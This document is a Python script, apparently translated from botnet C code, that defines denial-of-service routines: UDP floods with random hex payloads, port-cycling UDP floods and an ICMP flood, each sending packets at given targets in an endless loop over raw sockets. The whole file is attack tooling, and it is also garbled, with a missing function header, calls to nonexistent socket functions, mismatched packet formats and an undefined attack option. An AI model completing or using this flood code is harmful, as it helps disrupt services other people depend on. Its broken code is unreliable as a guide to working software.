import socket
import random
import struct
import argparse

parser = argparse.ArgumentParser(description='Description of your script')
    parser.add_argument('--sport', type=int, default=0xFFFF, help='Source port')
    parser.add_argument('--dport', type=int, default=0xFFFF, help='Destination port')
    parser.add_argument('--data_len', type=int, default=1458, help='Length of data')
    parser.add_argument('--data_rand', action='store_true', help='Randomize data')
    parser.add_argument('--ip_tos', type=int, default=0, help='IP TOS')
    parser.add_argument('--ip_ident', type=int, default=0xFFFF, help='IP Identification')
    parser.add_argument('--ip_ttl', type=int, default=0xFF, help='IP TTL')
    parser.add_argument('--icmp_type', type=int, default=8, help='ICMP type')
    parser.add_argument('--icmp_code', type=int, default=0, help='ICMP code')
    parser.add_argument('targets', nargs='+', help='List of targets')
    return parser.parse_args()
def rand_next():
    return random.randint(0, 2**32 - 1)

def checksum_generic(data, length):
    s = 0
    for i in range(0, length, 2):
        w = struct.unpack('!H', data[i:i+2])[0]
        s = (s + w) & 0xFFFF
        if s > 0xFFFF:
            s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def checksum_tcpudp(iph, udph, ulen, plen):
    buf = struct.pack('!4s4sBBH',
                       iph.saddr, iph.daddr,
                       iph.protocol, ulen + plen)
    buf += struct.pack('!H', udph.source)
    buf += struct.pack('!H', udph.dest)
    buf += struct.pack('!H', udph.len)
    for i in range(0, plen, 2):
        w = struct.unpack('!H', data[i:i+2])[0]
        buf += struct.pack('!H', w)
    return checksum_generic(buf, len(buf))

def attack_udp_stdhex(targs, opts):
    i = 0
    pkts = [b''] * len(targs)
    fds = [0] * len(targs)
    dport = opts.get('dport', 0xFFFF)
    sport = opts.get('sport', 0xFFFF)
    data_len = opts.get('data_len', 1458)
    data_rand = opts.get('data_rand', True)
    bind_addr = socket.INET(0, socket.SOCK_DGRAM, 0)
    bind_addr.sin_port = sport
    if sport == 0xFFFF:
        sport = rand_next()
    for i in range(len(targs)):
        iph = struct.pack('!BBHHHBBH4s4s',
                           5, 4,
                           random.randint(0, 0xFFFF),
                           random.randint(0, 0xFFFF),
                           0,
                           64,
                           random.randint(0, 0xFFFF),
                           targs[i].addr,
                           targs[i].netmask)
        udph = struct.pack('!HH',
                           sport,
                           dport)
        if data_rand:
            data = bytes.fromhex('00' + ''.join(random.choices('0123456789abcdef', k=data_len)))
        else:
            data = bytes.fromhex('00' * data_len)
        pkts[i] = iph + udph + data
        fds[i] = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        fds[i].bind(bind_addr)
        targs[i].sock_addr = socket.INET(targs[i].port, socket.SOCK_DGRAM)
        targs[i].sock_addr.sin_addr = struct.pack('!I', targs[i].addr)
        fds[i].connect(targs[i].sock_addr)
    while True:
        for i in range(len(targs)):
            if data_rand:
                data = bytes.fromhex('00' + ''.join(random.choices('0123456789abcdef', k=data_len)))
            else:
                data = bytes.fromhex('00' * data_len)
            fds[i].send(data)

def attack_udp_ovhhex(targs, opts):
    i = 0
    fd = 0
    pkts = [b''] * len(targs)
    ip_tos = opts.get('ip_tos', 0)
    ip_ident = opts.get('ip_ident', 0xFFFF)
    ip_ttl = opts.get('ip_ttl', 0xFF)
    sport = opts.get('sport', 0xFFFF)
    dport = opts.get('dport', 0xFFFF)
    data_len = opts.get('data_len', 1458)
    data_rand = opts.get('data_rand', True)
    for i in range(len(targs)):
        iph = struct.pack('!BBHHHBBH4s4s',
                           5, ip_tos,
                           random.randint(0, 0xFFFF),
                           random.randint(0, 0xFFFF),
                           0,
                           64,
                           ip_ident,
                           ip_ttl,
                           targs[i].addr,
                           targs[i].netmask)
        udph = struct.pack('!HH',
                           sport,
                           dport)
        if data_rand:
            data = bytes.fromhex('00' + ''.join(random.choices('0123456789abcdef', k=data_len)))
        else:
            data = bytes.fromhex('00' * data_len)
        pkts[i] = iph + udph + data
    while True:
        for i in range(len(targs)):
            if data_rand:
                data = bytes.fromhex('00' + ''.join(random.choices('0123456789abcdef', k=data_len)))
            else:
                data = bytes.fromhex('00' * data_len)
            sock_addr = socket.INET(targs[i].port, socket.SOCK_DGRAM)
            sock_addr.sin_addr = struct.pack('!I', targs[i].addr)
            sendto(fd, data, 0, sock_addr)

def attack_udp_ip_src(targs, opts):
    i = 0
    pkts = [b''] * len(targs)
    sport = opts.get('sport', 0xFFFF)
    dport = opts.get('dport', 0xFFFF)
    data_len = opts.get('data_len', 1458)
    data_rand = opts.get('data_rand', True)
    ip_tos = opts.get('ip_tos', 0)
    ip_ident = opts.get('ip_ident', 0xFFFF)
    ip_ttl = opts.get('ip_ttl', 0xFF)
    bind_addr = socket.INET(0, socket.SOCK_DGRAM, 0)
    bind_addr.sin_port = sport
    if sport == 0xFFFF:
        sport = rand_next()
    for i in range(len(targs)):
        iph = struct.pack('!BBHHHBBH4s4s',
                           5, ip_tos,
                           random.randint(0, 0xFFFF),
                           random.randint(0, 0xFFFF),
                           0,
                           64,
                           ip_ident,
                           ip_ttl,
                           targs[i].addr,
                           targs[i].netmask)
        udph = struct.pack('!HH',
                           sport,
                           dport)
        if data_rand:
            data = bytes.fromhex('00' + ''.join(random.choices('0123456789abcdef', k=data_len)))
        else:
            data = bytes.fromhex('00' * data_len)
        pkts[i] = iph + udph + data
        targs[i].sock_addr = socket.INET(targs[i].port, socket.SOCK_DGRAM)
        targs[i].sock_addr.sin_addr = struct.pack('!I', targs[i].addr)
    while True:
        for i in range(len(targs)):
            if data_rand:
                data = bytes.fromhex('00' + ''.join(random.choices('0123456789abcdef', k=data_len)))
            else:
                data = bytes.fromhex('00' * data_len)
            bind_addr.sin_addr = struct.pack('!I', targs[i].addr)
            bind_addr.sin_port = sport
            bindto(fd, bind_addr)
            sendto(fd, data, 0, targs[i].sock_addr)

def attack_udp_ip_dst(targs, opts):
    pkts = [b''] * len(targs)
    sport = opts.get('sport', 0xFFFF)
    dport = opts.get('dport', 0xFFFF)
    data_len = opts.get('data_len', 1458)
    data_rand = opts.get('data_rand', True)
    ip_tos = opts.get('ip_tos', 0)
    ip_ident = opts.get('ip_ident', 0xFFFF)
    ip_ttl = opts.get('ip_ttl', 0xFF)
    bind_addr = socket.INET(0, socket.SOCK_DGRAM, 0)
    bind_addr.sin_port = sport
    if sport == 0xFFFF:
        sport = rand_next()
    for i in range(len(targs)):
        iph = struct.pack('!BBHHHBBH4s4s',
                           5, ip_tos,
                           random.randint(0, 0xFFFF),
                           random.randint(0, 0xFFFF),
                           0,
                           64,
                           ip_ident,
                           ip_ttl,
                           targs[i].addr,
                           targs[i].netmask)
        udph = struct.pack('!HH',
                           sport,
                           dport)
        if data_rand:
            data = bytes.fromhex('00' + ''.join(random.choices('0123456789abcdef', k=data_len)))
        else:
            data = bytes.fromhex('00' * data_len)
        pkts[i] = iph + udph + data
    while True:
        for i in range(len(targs)):
            if data_rand:
                data = bytes.fromhex('00' + ''.join(random.choices('0123456789abcdef', k=data_len)))
            else:
                data = bytes.fromhex('00' * data_len)
            sendto(fd, data, 0, (socket.INET, 0, targs[i].addr, targs[i].port))

def attack_udp_port_src(targs, opts):
    i = 0
    pkts = [b''] * len(targs)
    sport = opts.get('sport', 0xFFFF)
    dport = opts.get('dport', 0xFFFF)
    data_len = opts.get('data_len', 1458)
    data_rand = opts.get('data_rand', True)
    ip_tos = opts.get('ip_tos', 0)
    ip_ident = opts.get('ip_ident', 0xFFFF)
    ip_ttl = opts.get('ip_ttl', 0xFF)
    for i in range(len(targs)):
        iph = struct.pack('!BBHHHBBH4s4s',
                           5, ip_tos,
                           random.randint(0, 0xFFFF),
                           random.randint(0, 0xFFFF),
                           0,
                           64,
                           ip_ident,
                           ip_ttl,
                           targs[i].addr,
                           targs[i].netmask)
        udph = struct.pack('!HH',
                           sport,
                           dport)
        if data_rand:
            data = bytes.fromhex('00' + ''.join(random.choices('0123456789abcdef', k=data_len)))
        else:
            data = bytes.fromhex('00' * data_len)
        pkts[i] = iph + udph + data
    while True:
        for i in range(len(targs)):
            if data_rand:
                data = bytes.fromhex('00' + ''.join(random.choices('0123456789abcdef', k=data_len)))
            else:
                data = bytes.fromhex('00' * data_len)
            sport = (sport + 1) % 0xFFFF
            udph = struct.pack('!HH',
                               sport,
                               dport)
            pkts[i] = iph + udph + data
            sendto(fd, pkts[i], 0, targs[i].sock_addr)

def attack_udp_port_dst(targs, opts):
    pkts = [b''] * len(targs)
    sport = opts.get('sport', 0xFFFF)
    dport = opts.get('dport', 0xFFFF)
    data_len = opts.get('data_len', 1458)
    data_rand = opts.get('data_rand', True)
    ip_tos = opts.get('ip_tos', 0)
    ip_ident = opts.get('ip_ident', 0xFFFF)
    ip_ttl = opts.get('ip_ttl', 0xFF)
    for i in range(len(targs)):
        iph = struct.pack('!BBHHHBBH4s4s',
                           5, ip_tos,
                           random.randint(0, 0xFFFF),
                           random.randint(0, 0xFFFF),
                           0,
                           64,
                           ip_ident,
                           ip_ttl,
                           targs[i].addr,
                           targs[i].netmask)
        udph = struct.pack('!HH',
                           sport,
                           dport)
        if data_rand:
            data = bytes.fromhex('00' + ''.join(random.choices('0123456789abcdef', k=data_len)))
        else:
            data = bytes.fromhex('00' * data_len)
        pkts[i] = iph + udph + data
    while True:
        for i in range(len(targs)):
            if data_rand:
                data = bytes.fromhex('00' + ''.join(random.choices('0123456789abcdef', k=data_len)))
            else:
                data = bytes.fromhex('00' * data_len)
            dport = (dport + 1) % 0xFFFF
            udph = struct.pack('!HH',
                               sport,
                               dport)
            pkts[i] = iph + udph + data
            sendto(fd, pkts[i], 0, targs[i].sock_addr)

def attack_udp_flood(targs, opts):
    pkts = [b''] * len(targs)
    sport = opts.get('sport', 0xFFFF)
    dport = opts.get('dport', 0xFFFF)
    data_len = opts.get('data_len', 1458)
    data_rand = opts.get('data_rand', True)
    ip_tos = opts.get('ip_tos', 0)
    ip_ident = opts.get('ip_ident', 0xFFFF)
    ip_ttl = opts.get('ip_ttl', 0xFF)
    while True:
        for i in range(len(targs)):
            if data_rand:
                data = bytes.fromhex('00' + ''.join(random.choices('0123456789abcdef', k=data_len)))
            else:
                data = bytes.fromhex('00' * data_len)
            iph = struct.pack('!BBHHHBBH4s4s',
                           5, ip_tos,
                           random.randint(0, 0xFFFF),
                           random.randint(0, 0xFFFF),
                           0,
                           64,
                           ip_ident,
                           ip_ttl,
                           targs[i].addr,
                           targs[i].netmask)
            udph = struct.pack('!HH',
                           sport,
                           dport)
            pkts[i] = iph + udph + data
            sendto(fd, pkts[i], 0, targs[i].sock_addr)

def attack_icmp_flood(targs, opts):
    pkts = [b''] * len(targs)
    icmp_type = opts.get('icmp_type', 8)
    icmp_code = opts.get('icmp_code', 0)
    ip_tos = opts.get('ip_tos', 0)
    ip_ident = opts.get('ip_ident', 0xFFFF)
    ip_ttl = opts.get('ip_ttl', 0xFF)
    while True:
        for i in range(len(targs)):
            iph = struct.pack('!BBHHHBBH4s4s',
                           5, ip_tos,
                           random.randint(0, 0xFFFF),
                           random.randint(0, 0xFFFF),
                           0,
                           1,
                           ip_ident,
                           ip_ttl,
                           targs[i].addr,
                           targs[i].netmask)
            icmph = struct.pack('!BB',
                           icmp_type,
                           icmp_code)
            checksum = icmp_checksum(icmph + b'\x00' * 6)
            icmph = struct.pack('!BBH',
                           icmp_type,
                           icmp_code,
                           checksum)
            pkts[i] = iph + icmph + b'\x00' * 6
            sendto(fd, pkts[i], 0, targs[i].sock_addr)

def icmp_checksum(pkt):
    words = list(struct.unpack('!{}H'.format(len(pkt) // 2), pkt))
    checksum = sum(words)
    while checksum > 0xFFFF:
        carry = checksum // 0xFFFF
        checksum -= carry * 0xFFFF
    return checksum ^ 0xFFFF

def main():
    args = parse_args()
    opts = {
        'sport': args.sport,
        'dport': args.dport,
        'data_len': args.data_len,
        'data_rand': args.data_rand,
        'ip_tos': args.ip_tos,
        'ip_ident': args.ip_ident,
        'ip_ttl': args.ip_ttl,
        'icmp_type': args.icmp_type,
        'icmp_code': args.icmp_code
    }
    targets = args.targets
    attack_types = {
        'udp_flood': attack_udp_flood,
        'udp_port_dst': attack_udp_port_dst,
        'udp_port_src': attack_udp_port_src,
        'icmp_flood': attack_icmp_flood
    }
    fd = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    fd.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    try:
        attack_types[args.attack](targets, opts)
    except KeyError:
        print('Unknown attack type')

if __name__ == '__main__':
    main()
\end{code}

